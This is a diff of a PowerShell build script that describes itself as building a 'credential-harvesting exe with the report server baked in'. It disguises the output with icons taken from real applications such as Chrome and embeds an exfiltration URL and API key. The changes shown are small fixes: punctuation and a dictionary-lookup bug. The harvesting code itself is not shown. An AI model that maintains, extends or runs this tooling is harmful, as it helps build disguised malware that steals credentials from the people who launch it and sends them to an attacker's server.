@@ -1,4 +1,4 @@
-# build_windows.ps1 — builds a credential-harvesting exe with the report server baked in.
+# build_windows.ps1 -builds a credential-harvesting exe with the report server baked in.
 # Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
 #   .\build_windows.ps1 -Preset chrome
 #
@@ -150,7 +150,7 @@ if ($Preset) {
             if ($found) { $IconFile = $found.FullName; break }
         }
         if (-not $IconFile) {
-            Write-Host "[!] $($def.Desc) not found on this machine — building without icon"
+            Write-Host "[!] $($def.Desc) not found on this machine -building without icon"
         }
     }
 }
@@ -191,7 +191,7 @@ if (-not $ExeName -and -not $Preset) {
     Write-Host ""
     $choice = Read-Host "Enter number"
 
-    if ($menuItems.Contains([int]$choice)) {
+    if ($menuItems.ContainsKey([int]$choice)) {
         $Preset = $menuItems[[int]$choice]
         $key    = $Preset.ToLower()
         $def    = $presetDefs[$key]
@@ -204,7 +204,7 @@ if (-not $ExeName -and -not $Preset) {
                 if ($found) { $IconFile = $found.FullName; break }
             }
             if (-not $IconFile) {
-                Write-Host "[!] $($def.Desc) not found on this machine — building without icon"
+                Write-Host "[!] $($def.Desc) not found on this machine -building without icon"
             }
         }
     } else {
@@ -233,8 +233,8 @@ if (-not $ExfilUrl -or -not $ExfilKey) {
     }
 }
 
-if (-not $ExfilUrl) { Write-Error "ExfilUrl not set — add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
-if (-not $ExfilKey) { Write-Error "ExfilKey not set — add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }
+if (-not $ExfilUrl) { Write-Error "ExfilUrl not set -add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
+if (-not $ExfilKey) { Write-Error "ExfilKey not set -add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }
 
 Write-Host "[*] Building $ExeName.exe"
 Write-Host "    Exfil URL:    $ExfilUrl"
